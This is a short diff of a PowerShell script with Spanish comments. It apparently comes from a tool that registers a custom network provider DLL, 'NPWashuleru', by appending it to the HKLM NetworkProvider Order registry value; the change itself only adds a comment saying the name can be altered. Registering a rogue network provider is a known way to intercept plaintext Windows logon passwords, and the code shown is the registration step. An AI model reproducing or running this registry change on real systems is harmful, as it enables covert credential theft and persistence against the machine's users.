@@ -19,7 +19,7 @@ Remove-Item "$directorioActual\*.dll"
 
 #registro proveedor
 $path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
-$dllnetprov = "NPWashuleru"
+$dllnetprov = "NPWashuleru" #opcional: se puede colocar otro nombre
 $UpdatedValue = $Path.PROVIDERORDER + ",$dllnetprov"
 Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
 
